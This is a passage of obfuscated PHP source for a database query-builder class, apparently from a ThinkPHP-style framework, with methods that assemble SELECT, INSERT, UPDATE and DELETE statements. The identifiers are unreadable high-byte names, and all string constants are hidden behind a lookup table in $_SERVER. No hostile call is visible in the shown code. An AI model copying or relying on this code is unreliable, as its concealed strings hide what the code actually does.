$²°‘×²Ò[$ÙÍ½ê±[208]], $ÙÍ½ê±[981] => isset($²°‘×²Ò[$ÙÍ½ê±[679]]) ? $²°‘×²Ò[$ÙÍ½ê±[679]] : $ÙÍ½ê±[12], $ÙÍ½ê±[982] => isset($²°‘×²Ò[$ÙÍ½ê±[1078]]) ? $²°‘×²Ò[$ÙÍ½ê±[1078]] : $ÙÍ½ê±[12], $ÙÍ½ê±[979] => isset($²°‘×²Ò[$ÙÍ½ê±[209]]) ? $²°‘×²Ò[$ÙÍ½ê±[209]] : $ÙÍ½ê±[12], $ÙÍ½ê±[980] => isset($²°‘×²Ò[$ÙÍ½ê±[210]]) ? $²°‘×²Ò[$ÙÍ½ê±[210]] : $ÙÍ½ê±[12], $ÙÍ½ê±[21] => isset($²°‘×²Ò[$ÙÍ½ê±[87]]) ? substr($²°‘×²Ò[$ÙÍ½ê±[87]], 1) : $ÙÍ½ê±[12]); } else { preg_match($ÙÍ½ê±[1079], trim($²ôÈ÷Û³), $—ŸğÄÄ’); $‰»¾èÅÅ = array($ÙÍ½ê±[1054] => $—ŸğÄÄ’[1], $ÙÍ½ê±[981] => $—ŸğÄÄ’[2], $ÙÍ½ê±[982] => $—ŸğÄÄ’[3], $ÙÍ½ê±[979] => $—ŸğÄÄ’[4], $ÙÍ½ê±[980] => $—ŸğÄÄ’[5], $ÙÍ½ê±[21] => $—ŸğÄÄ’[6]); } $‰»¾èÅÅ[$ÙÍ½ê±[1009]] = $ÙÍ½ê±[12]; return $‰»¾èÅÅ; } protected function debug() { $Ä ÀèÙš =& $_SERVER[‹‰”››ê]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ä ÀèÙš[1080]; if (think_config($Ä ÀèÙš[1081])) { think_status($Ä ÀèÙš[1082]); think_trace($this->queryStr . $Ä ÀèÙš[1083] . think_status($Ä ÀèÙš[24], $Ä ÀèÙš[1082], 6) . $Ä ÀèÙš[1084], $Ä ÀèÙš[12], $Ä ÀèÙš[1085]); } } protected function parseLock($ß©¹×³ç = false) { $î“À¯œƒ =& $_SERVER[‹‰”››ê]; if (!$ß©¹×³ç) { return $î“À¯œƒ[12]; } if ($î“À¯œƒ[1011] == $this->dbType) { return $î“À¯œƒ[1086]; } return $î“À¯œƒ[1087]; } protected function parseSet($©øŠåôš) { $€«¶µï© =& $_SERVER[‹‰”››ê]; foreach ($©øŠåôš as $ËÖ…À¶° => $­Û¼Éç›) { if (is_array($­Û¼Éç›) && $€«¶µï©[384] == $­Û¼Éç›[0]) { $°†ù™æê[] = $this->parseKey($ËÖ…À¶°) . $€«¶µï©[518] . $­Û¼Éç›[1]; } elseif (is_scalar($­Û¼Éç›) || is_null($­Û¼Éç›)) { $°†ù™æê[] = $this->parseKey($ËÖ…À¶°) . $€«¶µï©[518] . $this->parseValue($­Û¼Éç›); } } return $€«¶µï©[1088] . implode($€«¶µï©[50], $°†ù™æê); } protected function bindParam($†„Ù³É, $È‡’œ) { $this->bind[$_SERVER[‹‰”››ê][4] . $†„Ù³É] = $È‡’œ; } protected function parseBind($¬Êœ•ãÕ) { $¬Êœ•ãÕ = array_merge($this->bind, $¬Êœ•ãÕ); $this->bind = array(); return $¬Êœ•ãÕ; } function parseKey(&$˜Œ©÷åª, $Ä´ŠÕÏ“ = true) { if ($Ä´ŠÕÏ“) { $˜Œ©÷åª = $this->parseKeyCheck($˜Œ©÷åª); } return $˜Œ©÷åª; } function parseKeyCheck($’¿Øôõ) { $óş”ªà =& $_SERVER[‹‰”››ê]; $’¿Øôõ = trim($’¿Øôõ); if (!preg_match($óş”ªà[1089], $’¿Øôõ)) { think_exception($óş”ªà[1090] . $’¿Øôõ); } return $’¿Øôõ; } protected function parseValue($ï„¿¾Œ›) { $±¨¼·ß¦ =& $_SERVER[‹‰”››ê]; if (is_string($ï„¿¾Œ›)) { $ï„¿¾Œ› = $±¨¼·ß¦[1050] . $this->escapeString($ï„¿¾Œ›) . $±¨¼·ß¦[1050]; } elseif (isset($ï„¿¾Œ›[0]) && is_string($ï„¿¾Œ›[0]) && strtolower($ï„¿¾Œ›[0]) == $±¨¼·ß¦[384]) { $ï„¿¾Œ› = $this->escapeString($ï„¿¾Œ›[1]); } elseif (is_array($ï„¿¾Œ›)) { $ï„¿¾Œ› = array_map(array($this, $±¨¼·ß¦[1051]), $ï„¿¾Œ›); } elseif (is_bool($ï„¿¾Œ›)) { $ï„¿¾Œ› = $ï„¿¾Œ› ? $±¨¼·ß¦[91] : $±¨¼·ß¦[231]; } elseif (is_null($ï„¿¾Œ›)) { $ï„¿¾Œ› = $±¨¼·ß¦[106]; } return $ï„¿¾Œ›; } protected function parseField($«ïà¡è“) { $¥”îÃ“Á =& $_SERVER[‹‰”››ê]; if (is_string($«ïà¡è“) && strpos($«ïà¡è“, $¥”îÃ“Á[50])) { $«ïà¡è“ = explode($¥”îÃ“Á[50], $«ïà¡è“); } if (is_array($«ïà¡è“)) { $¿©§ıˆ = array(); foreach ($«ïà¡è“ as $è«…êŒœ => $ïĞÉò¥›) { if (!is_numeric($è«…êŒœ)) { $¿©§ıˆ[] = $this->parseKey($è«…êŒœ, !1) . $¥”îÃ“Á[1091] . $this->parseKey($ïĞÉò¥›); } else { $¿©§ıˆ[] = $this->parseKey($ïĞÉò¥›); } } $®øá·ô = implode($¥”îÃ“Á[50], $¿©§ıˆ); } elseif (is_string($«ïà¡è“) && !empty($«ïà¡è“)) { $®øá·ô = $«ïà¡è“; } else { $®øá·ô = $¥”îÃ“Á[223]; } return $®øá·ô; } protected function parseTable($¡×øûô‡) { $åªŠöŞ =& $_SERVER[‹‰”››ê]; if (is_array($¡×øûô‡)) { $¹íóºì’ = array(); foreach ($¡×øûô‡ as $Ñ¥Çüóğ => $½ñìàŞ“) { if (!is_numeric($Ñ¥Çüóğ)) { $¹íóºì’[] = $this->parseKey($Ñ¥Çüóğ) . $åªŠöŞ[53] . $this->parseKey($½ñìàŞ“); } else { $¹íóºì’[] = $this->parseKey($Ñ¥Çüóğ); } } $¡×øûô‡ = $¹íóºì’; } elseif (is_string($¡×øûô‡)) { if (strstr($¡×øûô‡, $åªŠöŞ[53])) { return $¡×øûô‡; } $¡×øûô‡ = explode($åªŠöŞ[50], $¡×øûô‡); array_walk($¡×øûô‡, array($this, $åªŠöŞ[999])); } return $åªŠöŞ[993] . trim(implode($åªŠöŞ[1092], $¡×øûô‡), $åªŠöŞ[473]) . $åªŠöŞ[993]; } protected function parseWhere($Íµ¤í·û) { $Ñ¯ıÆÆ =& $_SERVER[‹‰”››ê]; $°Ö¥”Œ = $Ñ¯ıÆÆ[12]; if (is_string($Íµ¤í·û)) { $°Ö¥”Œ = $Íµ¤í·û; } else { $Ó½€öª¤ = isset($Íµ¤í·û[$Ñ¯ıÆÆ[1093]]) ? strtoupper($Íµ¤í·û[$Ñ¯ıÆÆ[1093]]) : $Ñ¯ıÆÆ[12]; if (in_array($Ó½€öª¤, array($Ñ¯ıÆÆ[1094], $Ñ¯ıÆÆ[1095], $Ñ¯ıÆÆ[1096]))) { $Ó½€öª¤ = $Ñ¯ıÆÆ[53] . $Ó½€öª¤ . $Ñ¯ıÆÆ[53]; unset($Íµ¤í·û[$Ñ¯ıÆÆ[1093]]); } else { $Ó½€öª¤ = $Ñ¯ıÆÆ[1097]; } foreach ($Íµ¤í·û as $à¯ÜãÑ— => $»«ğ©é‹) { $°Ö¥”Œ .= $Ñ¯ıÆÆ[366]; if (is_numeric($à¯ÜãÑ—)) { $à¯ÜãÑ— = $Ñ¯ıÆÆ[1098]; } if (0 === strpos($à¯ÜãÑ—, $Ñ¯ıÆÆ[11])) { $°Ö¥”Œ .= $this->parseThinkWhere($à¯ÜãÑ—, $»«ğ©é‹); } else { if (!preg_match($Ñ¯ıÆÆ[1099], trim($à¯ÜãÑ—))) { think_exception(think_lang($Ñ¯ıÆÆ[1100]) . $Ñ¯ıÆÆ[4] . $à¯ÜãÑ—); } $”“´—¢¤ = is_array($»«ğ©é‹) && isset($»«ğ©é‹[$Ñ¯ıÆÆ[1101]]); $à¯ÜãÑ— = trim($à¯ÜãÑ—); if (strpos($à¯ÜãÑ—, $Ñ¯ıÆÆ[215])) { $µ‘É…«¤ = explode($Ñ¯ıÆÆ[215], $à¯ÜãÑ—); $ĞæáÊ§© = array(); foreach ($µ‘É…«¤ as $Ğ™±’¼ => $ç¸ç¶) { $§©é¯š¬ = $”“´—¢¤ ? $»«ğ©é‹[$Ğ™±’¼] : $»«ğ©é‹; $ĞæáÊ§©[] = $Ñ¯ıÆÆ[349] . $this->parseWhereItem($this->parseKey($ç¸ç¶), $§©é¯š¬) . $Ñ¯ıÆÆ[998]; } $°Ö¥”Œ .= implode($Ñ¯ıÆÆ[1102], $ĞæáÊ§©); } elseif (strpos($à¯ÜãÑ—, $Ñ¯ıÆÆ[287])) { $µ‘É…«¤ = explode($Ñ¯ıÆÆ[287], $à¯ÜãÑ—); $ĞæáÊ§© = array(); foreach ($µ‘É…«¤ as $Ğ™±’¼ => $ç¸ç¶) { $§©é¯š¬ = $”“´—¢¤ ? $»«ğ©é‹[$Ğ™±’¼] : $»«ğ©é‹; $ĞæáÊ§©[] = $Ñ¯ıÆÆ[349] . $this->parseWhereItem($this->parseKey($ç¸ç¶), $§©é¯š¬) . $Ñ¯ıÆÆ[998]; } $°Ö¥”Œ .= implode($Ñ¯ıÆÆ[1097], $ĞæáÊ§©); } else { $°Ö¥”Œ .= $this->parseWhereItem($this->parseKey($à¯ÜãÑ—), $»«ğ©é‹); } } $°Ö¥”Œ .= $Ñ¯ıÆÆ[367] . $Ó½€öª¤; } $°Ö¥”Œ = substr($°Ö¥”Œ, 0, -strlen($Ó½€öª¤)); } return empty($°Ö¥”Œ) ? $Ñ¯ıÆÆ[12] : $Ñ¯ıÆÆ[1103] . $°Ö¥”Œ; } protected function parseWhereItem($¾âªïÇ, $¬¦ú˜¨) { $Ñèù±« =& $_SERVER[‹‰”››ê]; $ì›û·² = $Ñèù±«[12]; if (is_array($¬¦ú˜¨)) { if (is_string($¬¦ú˜¨[0])) { $‹Å¹«í½ = strtolower($¬¦ú˜¨[0]); if (in_array($¬¦ú˜¨[0], array($Ñèù±«[518], $Ñèù±«[1104], $Ñèù±«[1105], $Ñèù±«[1106], $Ñèù±«[1107], $Ñèù±«[1108]))) { $ì›û·² .= $¾âªïÇ . $Ñèù±«[53] . $¬¦ú˜¨[0] . $Ñèù±«[53] . $this->parseValue($¬¦ú˜¨[1]); } elseif (preg_match($Ñèù±«[1109], $¬¦ú˜¨[0])) { $ì›û·² .= $¾âªïÇ . $Ñèù±«[53] . $this->exp[$‹Å¹«í½] . $Ñèù±«[53] . $this->parseValue($¬¦ú˜¨[1]); } elseif (preg_match($Ñèù±«[1110], $¬¦ú˜¨[0])) { if (is_array($¬¦ú˜¨[1])) { $¢¬Ìœñ = isset($¬¦ú˜¨[2]) ? strtoupper($¬¦ú˜¨[2]) : $Ñèù±«[1095]; if (in_array($¢¬Ìœñ, array($Ñèù±«[1094], $Ñèù±«[1095], $Ñèù±«[1096]))) { $øØèüšÑ = array(); foreach ($¬¦ú˜¨[1] as $‚â¬Îİ†) { $øØèüšÑ[] = $¾âªïÇ . $Ñèù±«[53] . $this->exp[$‹Å¹«í½] . $Ñèù±«[53] . $this->parseValue($‚â¬Îİ†); } $ì›û·² .= $Ñèù±«[349] . implode($Ñèù±«[53] . $¢¬Ìœñ . $Ñèù±«[53], $øØèüšÑ) . $Ñèù±«[998]; } } else { $ì›û·² .= $¾âªïÇ . $Ñèù±«[53] . $this->exp[$‹Å¹«í½] . $Ñèù±«[53] . $this->parseValue($¬¦ú˜¨[1]); } } elseif ($Ñèù±«[384] == $‹Å¹«í½) { $ì›û·² .= $Ñèù±«[996] . $¾âªïÇ . $Ñèù±«[53] . $¬¦ú˜¨[1] . $Ñèù±«[1111]; } elseif (preg_match($Ñèù±«[1112], $¬¦ú˜¨[0])) { $ì›û·² .= $¬¦ú˜¨[0]; } elseif (preg_match($Ñèù±«[1113], $¬¦ú˜¨[0])) { if (isset($¬¦ú˜¨[2]) && $Ñèù±«[384] == $¬¦ú˜¨[2]) { $ì›û·² .= $¾âªïÇ . $Ñèù±«[53] . $this->exp[$‹Å¹«í½] . $Ñèù±«[53] . $¬¦ú˜¨[1]; } else { if (is_string($¬¦ú˜¨[1])) { $¬¦ú˜¨[1] = explode($Ñèù±«[50], $¬¦ú˜¨[1]); } $¯æó¼š = implode($Ñèù±«[50], $this->parseValue($¬¦ú˜¨[1])); $ì›û·² .= $¾âªïÇ . $Ñèù±«[53] . $this->exp[$‹Å¹«í½] . $Ñèù±«[996] . $¯æó¼š . $Ñèù±«[998]; } } elseif (preg_match($Ñèù±«[1114], $¬¦ú˜¨[0])) { $íøâºÂ = is_string($¬¦ú˜¨[1]) ? explode($Ñèù±«[50], $¬¦ú˜¨[1]) : $¬¦ú˜¨[1]; $ì›û·² .= $Ñèù±«[996] . $¾âªïÇ . $Ñèù±«[53] . $this->exp[$‹Å¹«í½] . $Ñèù±«[53] . $this->parseValue($íøâºÂ[0]) . $Ñèù±«[1097] . $this->parseValue($íøâºÂ[1]) . $Ñèù±«[367]; } else { think_exception(think_lang($Ñèù±«[1100]) . $Ñèù±«[4] . $¬¦ú˜¨[0]); } } else { $°Ê¸—Ô = count($¬¦ú˜¨); $…ÖŒğÜ¦ = $Ñèù±«[12]; if (is_string($¬¦ú˜¨[$°Ê¸—Ô - 1])) { $…ÖŒğÜ¦ = isset($¬¦ú˜¨[$°Ê¸—Ô - 1]) ? strtoupper($¬¦ú˜¨[$°Ê¸—Ô - 1]) : $Ñèù±«[12]; if (in_array($…ÖŒğÜ¦, array($Ñèù±«[1094], $Ñèù±«[1095], $Ñèù±«[1096]))) { $°Ê¸—Ô = $°Ê¸—Ô - 1; } } else { $…ÖŒğÜ¦ = $Ñèù±«[1094]; } for ($ÙäæœıÌ = 0; $ÙäæœıÌ < $°Ê¸—Ô; $ÙäæœıÌ++) { $íøâºÂ = is_array($¬¦ú˜¨[$ÙäæœıÌ]) ? $¬¦ú˜¨[$ÙäæœıÌ][1] : $¬¦ú˜¨[$ÙäæœıÌ]; if ($Ñèù±«[384] == strtolower($¬¦ú˜¨[$ÙäæœıÌ][0])) { $ì›û·² .= $Ñèù±«[349] . $¾âªïÇ . $Ñèù±«[53] . $íøâºÂ . $Ñèù±«[1111] . $…ÖŒğÜ¦ . $Ñèù±«[53]; } else { $Ã¥·ºò¢ = is_array($¬¦ú˜¨[$ÙäæœıÌ]) ? $this->exp[strtolower($¬¦ú˜¨[$ÙäæœıÌ][0])] : $Ñèù±«[518]; if (!$Ã¥·ºò¢ && is_array($¬¦ú˜¨[$ÙäæœıÌ]) && in_array($¬¦ú˜¨[$ÙäæœıÌ][0], array($Ñèù±«[518], $Ñèù±«[1104], $Ñèù±«[1105], $Ñèù±«[1106], $Ñèù±«[1107], $Ñèù±«[1108]))) { $Ã¥·ºò¢ = $¬¦ú˜¨[$ÙäæœıÌ][0]; } $ì›û·² .= $Ñèù±«[349] . $¾âªïÇ . $Ñèù±«[53] . $Ã¥·ºò¢ . $Ñèù±«[53] . $this->parseValue($íøâºÂ) . $Ñèù±«[1111] . $…ÖŒğÜ¦ . $Ñèù±«[53]; } } $ì›û·² = substr($ì›û·², 0, -4); } } else { $ì›û·² .= $¾âªïÇ . $Ñèù±«[1115] . $this->parseValue($¬¦ú˜¨); } return $ì›û·²; } protected function parseThinkWhere($²§ÜŸü, $Üú¶€á©) { $éşê“ôë =& $_SERVER[‹‰”››ê]; $ë”çº« = $éşê“ôë[12]; switch ($²§ÜŸü) { case $éşê“ôë[439]: $ë”çº« = $Üú¶€á©; break; case $éşê“ôë[1098]: $ë”çº« = is_string($Üú¶€á©) ? $Üú¶€á© : substr($this->parseWhere($Üú¶€á©), 6); break; case $éşê“ôë[1116]: parse_str($Üú¶€á©, $å¯úã); if (isset($å¯úã[$éşê“ôë[1093]])) { $¤»ñòÚ¤ = $éşê“ôë[53] . strtoupper($å¯úã[$éşê“ôë[1093]]) . $éşê“ôë[53]; unset($å¯úã[$éşê“ôë[1093]]); } else { $¤»ñòÚ¤ = $éşê“ôë[1097]; } $²şÑßÚï = array(); foreach ($å¯úã as $ñ–©‘ƒ => $¸Ç—”ã±) { $²şÑßÚï[] = $this->parseKey($ñ–©‘ƒ) . $éşê“ôë[1115] . $this->parseValue($¸Ç—”ã±); } $ë”çº« = implode($¤»ñòÚ¤, $²şÑßÚï); break; } return $ë”çº«; } protected function parseLimit($æÈëƒ) { $³ãáÀ¨§ =& $_SERVER[‹‰”››ê]; return !empty($æÈëƒ) ? $³ãáÀ¨§[51] . $æÈëƒ . $³ãáÀ¨§[53] : $³ãáÀ¨§[12]; } protected function parseJoin($²æË•Ä) { $¡‰„ÍŠÏ =& $_SERVER[‹‰”››ê]; $÷–ƒª˜° = $¡‰„ÍŠÏ[12]; if (!empty($²æË•Ä)) { if (is_array($²æË•Ä)) { foreach ($²æË•Ä as $ÊÈà¼‚ => $³‘é˜‰) { if (!1 !== stripos($³‘é˜‰, $¡‰„ÍŠÏ[1117])) { $÷–ƒª˜° .= $¡‰„ÍŠÏ[53] . $³‘é˜‰; } else { $÷–ƒª˜° .= $¡‰„ÍŠÏ[1118] . $³‘é˜‰; } } } else { $÷–ƒª˜° .= $¡‰„ÍŠÏ[1118] . $²æË•Ä; } } $÷–ƒª˜° = preg_replace($¡‰„ÍŠÏ[1119], think_config($¡‰„ÍŠÏ[1023]) . $¡‰„ÍŠÏ[1120], $÷–ƒª˜°); return $÷–ƒª˜°; } protected function parseOrder($¯‚ˆÎ´ê) { $½’–¸Ë° =& $_SERVER[‹‰”››ê]; if (is_array($¯‚ˆÎ´ê)) { $´¦Ó¦¶› = array(); foreach ($¯‚ˆÎ´ê as $¬«‰ÇÜ => $Çòõò€‘) { if (is_numeric($¬«‰ÇÜ)) { $´¦Ó¦¶›[] = $this->parseKey($Çòõò€‘); } else { $Çòõò€‘ = in_array(strtoupper(trim($Çòõò€‘)), array($½’–¸Ë°[1121], $½’–¸Ë°[1122])) ? $½’–¸Ë°[53] . $Çòõò€‘ : $½’–¸Ë°[12]; if (preg_match($½’–¸Ë°[1123], $¬«‰ÇÜ)) { $´¦Ó¦¶›[] = $this->parseKey($¬«‰ÇÜ) . $Çòõò€‘; } else { think_exception($½’–¸Ë°[1124] . $¬«‰ÇÜ); } } } $¯‚ˆÎ´ê = implode($½’–¸Ë°[50], $´¦Ó¦¶›); } return !empty($¯‚ˆÎ´ê) ? $½’–¸Ë°[1125] . $¯‚ˆÎ´ê : $½’–¸Ë°[12]; } protected function parseGroup($Œ±ÔŠÃ‘) { $‘Â’ö‘¡ =& $_SERVER[‹‰”››ê]; return !empty($Œ±ÔŠÃ‘) ? $‘Â’ö‘¡[1126] . $Œ±ÔŠÃ‘ : $‘Â’ö‘¡[12]; } protected function parseHaving($È¶µ¥Ó²) { $À±–®äº =& $_SERVER[‹‰”››ê]; return !empty($È¶µ¥Ó²) ? $À±–®äº[1127] . $È¶µ¥Ó² : $À±–®äº[12]; } protected function parseComment($àË¤ÇŠï) { $½½Å×Çô =& $_SERVER[‹‰”››ê]; return !empty($àË¤ÇŠï) ? $½½Å×Çô[1128] . $àË¤ÇŠï . $½½Å×Çô[1129] : $½½Å×Çô[12]; } protected function parseDistinct($ÏšœÖØ…) { $àÙí—÷ü =& $_SERVER[‹‰”››ê]; return !empty($ÏšœÖØ…) ? $àÙí—÷ü[1130] : $àÙí—÷ü[12]; } protected function parseUnion($üí´òÇ®) { $²‡§¥˜ =& $_SERVER[‹‰”››ê]; if (empty($üí´òÇ®)) { return $²‡§¥˜[12]; } if (isset($üí´òÇ®[$²‡§¥˜[435]])) { $†òÊü³ù = $²‡§¥˜[1131]; unset($üí´òÇ®[$²‡§¥˜[435]]); } else { $†òÊü³ù = $²‡§¥˜[1132]; } foreach ($üí´òÇ® as $äæ©”Îª) { $®ôëÙñï[] = $†òÊü³ù . (is_array($äæ©”Îª) ? $this->buildSelectSql($äæ©”Îª) : $äæ©”Îª); } return implode($²‡§¥˜[53], $®ôëÙñï); } public function insert($¦¹²¬ŠÎ, $˜¸Øó½ß = array(), $„Ó·¼Ëá = false) { $òÑÃ›ñğ =& $_SERVER[‹‰”››ê]; $ÉÇÖÀÌ = $¾Î’Ô—İ = array(); $this->model = $˜¸Øó½ß[$òÑÃ›ñğ[370]]; foreach ($¦¹²¬ŠÎ as $Õûøù => $‘÷¬á¡â) { if (is_array($‘÷¬á¡â) && $òÑÃ›ñğ[384] == $‘÷¬á¡â[0]) { $¾Î’Ô—İ[] = $this->parseKey($Õûøù); $ÉÇÖÀÌ[] = $‘÷¬á¡â[1]; } elseif (is_scalar($‘÷¬á¡â) || is_null($‘÷¬á¡â)) { $¾Î’Ô—İ[] = $this->parseKey($Õûøù); $ÉÇÖÀÌ[] = $this->parseValue($‘÷¬á¡â); } } $±ƒé…Ù» = ($„Ó·¼Ëá ? $òÑÃ›ñğ[1000] : $òÑÃ›ñğ[1001]) . $òÑÃ›ñğ[1002] . $this->parseTable($˜¸Øó½ß[$òÑÃ›ñğ[368]]) . $òÑÃ›ñğ[996] . implode($òÑÃ›ñğ[50], $¾Î’Ô—İ) . $òÑÃ›ñğ[997] . implode($òÑÃ›ñğ[50], $ÉÇÖÀÌ) . $òÑÃ›ñğ[998]; $±ƒé…Ù» .= $this->parseLock(isset($˜¸Øó½ß[$òÑÃ›ñğ[939]]) ? $˜¸Øó½ß[$òÑÃ›ñğ[939]] : !1); $±ƒé…Ù» .= $this->parseComment(!empty($˜¸Øó½ß[$òÑÃ›ñğ[441]]) ? $˜¸Øó½ß[$òÑÃ›ñğ[441]] : $òÑÃ›ñğ[12]); return $this->execute($±ƒé…Ù», $this->parseBind(!empty($˜¸Øó½ß[$òÑÃ›ñğ[372]]) ? $˜¸Øó½ß[$òÑÃ›ñğ[372]] : array())); } public function selectInsert($”˜Õ·áÆ, $µ¿Ÿñ¶, $§»ô‚©‘ = array()) { $©– ¸û‘ =& $_SERVER[‹‰”››ê]; $this->model = $§»ô‚©‘[$©– ¸û‘[370]]; if (is_string($”˜Õ·áÆ)) { $”˜Õ·áÆ = explode($©– ¸û‘[50], $”˜Õ·áÆ); } array_walk($”˜Õ·áÆ, array($this, $©– ¸û‘[999])); $›‘ÎÀù³ = $©– ¸û‘[1133] . $this->parseTable($µ¿Ÿñ¶) . $©– ¸û‘[996] . implode($©– ¸û‘[50], $”˜Õ·áÆ) . $©– ¸û‘[1111]; $›‘ÎÀù³ .= $this->buildSelectSql($§»ô‚©‘); return $this->execute($›‘ÎÀù³, $this->parseBind(!empty($§»ô‚©‘[$©– ¸û‘[372]]) ? $§»ô‚©‘[$©– ¸û‘[372]] : array())); } public function update($ÈÄ®¬ê¿, $Â²şÙ¥³) { $²åÏ¶İ =& $_SERVER[‹‰”››ê]; $this->model = $Â²şÙ¥³[$²åÏ¶İ[370]]; $èİÜ±÷« = $²åÏ¶İ[1134] . $this->parseTable($Â²şÙ¥³[$²åÏ¶İ[368]]) . $this->parseSet($ÈÄ®¬ê¿) . $this->parseWhere(!empty($Â²şÙ¥³[$²åÏ¶İ[364]]) ? $Â²şÙ¥³[$²åÏ¶İ[364]] : $²åÏ¶İ[12]) . $this->parseOrder(!empty($Â²şÙ¥³[$²åÏ¶İ[453]]) ? $Â²şÙ¥³[$²åÏ¶İ[453]] : $²åÏ¶İ[12]) . $this->parseLimit(!empty($Â²şÙ¥³[$²åÏ¶İ[379]]) ? $Â²şÙ¥³[$²åÏ¶İ[379]] : $²åÏ¶İ[12]) . $this->parseLock(isset($Â²şÙ¥³[$²åÏ¶İ[939]]) ? $Â²şÙ¥³[$²åÏ¶İ[939]] : !1) . $this->parseComment(!empty($Â²şÙ¥³[$²åÏ¶İ[441]]) ? $Â²şÙ¥³[$²åÏ¶İ[441]] : $²åÏ¶İ[12]); return $this->execute($èİÜ±÷«, $this->parseBind(!empty($Â²şÙ¥³[$²åÏ¶İ[372]]) ? $Â²şÙ¥³[$²åÏ¶İ[372]] : array())); } public function delete($ì«¹–É‚ = array()) { $°ÃŠ£ü =& $_SERVER[‹‰”››ê]; $this->model = $ì«¹–É‚[$°ÃŠ£ü[370]]; $””Üë¤ = $°ÃŠ£ü[1135] . $this->parseTable($ì«¹–É‚[$°ÃŠ£ü[368]]) . $this->parseWhere(!empty($ì«¹–É‚[$°ÃŠ£ü[364]]) ? $ì«¹–É‚[$°ÃŠ£ü[364]] : $°ÃŠ£ü[12]) . $this->parseOrder(!empty($ì«¹–É‚[$°ÃŠ£ü[453]]) ? $ì«¹–É‚[$°ÃŠ£ü[453]] : $°ÃŠ£ü[12]) . $this->parseLimit(!empty($ì«¹–É‚[$°ÃŠ£ü[379]]) ? $ì«¹–É‚[$°ÃŠ£ü[379]] : $°ÃŠ£ü[12]) . $this->parseLock(isset($ì«¹–É‚[$°ÃŠ£ü[939]]) ? $ì«¹–É‚[$°ÃŠ£ü[939]] : !1) . $this->parseComment(!empty($ì«¹–É‚[$°ÃŠ£ü[441]]) ? $ì«¹–É‚[$°ÃŠ£ü[441]] : $°ÃŠ£ü[12]); return $this->execute($””Üë¤, $this->parseBind(!empty($ì«¹–É‚[$°ÃŠ£ü[372]]) ? $ì«¹–É‚[$°ÃŠ£ü[372]] : array())); } public function select($œŠ©­•â = array()) { $²¦€¬ =& $_SERVER[‹‰”››ê]; $this->model = $œŠ©­•â[$²¦€¬[370]]; $ÅøÔ£™ = $this->buildSelectSql($œŠ©­•â); $Å‰û¢›Á = isset($œŠ©­•â[$²¦€¬[436]]) ? $œŠ©­•â[$²¦€¬[436]] : !1; if ($Å‰û¢›Á) { $‘Ë¶ì“æ = is_string($Å‰û¢›Á[$²¦€¬[97]]) ? $Å‰û¢›Á[$²¦€¬[97]] : $²¦€¬[1136] . md5($ÅøÔ£™); $¾Âæ¡§§ = think_cache($‘Ë¶ì“æ, $²¦€¬[12], $Å‰û¢›Á); if (!1 !== $¾Âæ¡§§) { return $¾Âæ¡§§; } } $êåôñ“ä = $this->query($ÅøÔ£™, $this->parseBind(!empty($œŠ©­•â[$²¦€¬[372]]) ? $œŠ©­•â[$²¦€¬[372]] : array())); if ($Å‰û¢›Á && !1 !== $êåôñ“ä) { think_cache($‘Ë¶ì“æ, $êåôñ“ä, $Å‰û¢›Á); } return $êåôñ“ä; } public function buildSelectSql($£Í»€ù = array()) { $èÆÈ¢Üæ =& $_SERVER[‹‰”››ê]; if (isset($£Í»€ù[$èÆÈ¢Üæ[440]])) { if (strpos($£Í»€ù[$èÆÈ¢Üæ[440]], $èÆÈ¢Üæ[50])) { list($ƒíËşË‚, $•íî²ú³) = explode($èÆÈ¢Üæ[50], $£Í»€ù[$èÆÈ¢Üæ[440]]); } else { $ƒíËşË‚ = $£Í»€ù[$èÆÈ¢Üæ[440]]; } $ƒíËşË‚ = $ƒíËşË‚ ? $ƒíËşË‚ : 1; $•íî²ú³ = isset($•íî²ú³) ? $•íî²ú³ : (is_numeric($£Í»€ù[$èÆÈ¢Üæ[379]]) ? $£Í»€ù[$èÆÈ¢Üæ[379]] : 20); $µÏçöØÀ = $•íî²ú³ * ((int) $ƒíËşË‚ - 1); $£Í»€ù[$èÆÈ¢Üæ[379]] = $µÏçöØÀ . $èÆÈ¢Üæ[50] . $•íî²ú³; } if (think_config($èÆÈ¢Üæ[1137])) { $ÑÑÔ¨Ç‘ = $èÆÈ¢Üæ[1138] . md5(serialize($£Í»€ù)); $¥×¸¿Î = think_cache($ÑÑÔ¨Ç‘); if ($¥×¸¿Î) { return $¥×¸¿Î; } } $áÓò‡°Æ = $this->parseSql($this->selectSql, $£Í»€ù); $áÓò‡°Æ .= $this->parseLock(isset($£Í»€ù[$èÆÈ¢Üæ[939]]) ? $£Í»€ù[$èÆÈ¢Üæ[939]] : !1); if (isset($ÑÑÔ¨Ç‘)) { think_cache($ÑÑÔ¨Ç‘, $áÓò‡°Æ); } return $áÓò‡°Æ; } public function parseSql($‘ÈÓÌÑĞ, $©â´Úã = array()) { $ß¿ÌíÂ„ =& $_SERVER[‹‰”››ê]; $‘ÈÓÌÑĞ = str_replace(array($ß¿ÌíÂ„[1139], $ß¿ÌíÂ„[1140], $ß¿ÌíÂ„[1141], $ß¿ÌíÂ„[1142], $ß¿ÌíÂ„[1143], $ß¿ÌíÂ„[1144], $ß¿ÌíÂ„[1145], $ß¿ÌíÂ„[1146], $ß¿ÌíÂ„[1147], $ß¿ÌíÂ„[1148], $ß¿ÌíÂ„[1149]), array($this->parseTable("{$©â´Úã[$ß¿ÌíÂ„[368]]}"), $this->parseDistinct(isset($©â´Úã[$ß¿ÌíÂ„[1150]]) ? $©â´Úã[$ß¿ÌíÂ„[1150]] : !1), $this->parseField(!empty($©â´Úã[$ß¿ÌíÂ„[362]]) ? $©â´Úã[$ß¿ÌíÂ„[362]] : $ß¿ÌíÂ„[223]), $this->parseJoin(!empty($©â´Úã[$ß¿ÌíÂ„[371]]) ? $©â´Úã[$ß¿ÌíÂ„[371]] : $ß¿ÌíÂ„[12]), $this->parseWhere(!empty($©â´Úã[$ß¿ÌíÂ„[364]]) ? $©â´Úã[$ß¿ÌíÂ„[364]] : $ß¿ÌíÂ„[12]), $this->parseGroup(!empty($©â´Úã[$ß¿ÌíÂ„[592]]) ? $©â´Úã[$ß¿ÌíÂ„[592]] : $ß¿ÌíÂ„[12]), $this->parseHaving(!empty($©â´Úã[$ß¿ÌíÂ„[1151]]) ? $©â´Úã[$ß¿ÌíÂ„[1151]] : $ß¿ÌíÂ„[12]), $this->parseOrder(!empty($©â´Úã[$ß¿ÌíÂ„[453]]) ? $©â´Úã[$ß¿ÌíÂ„[453]] : 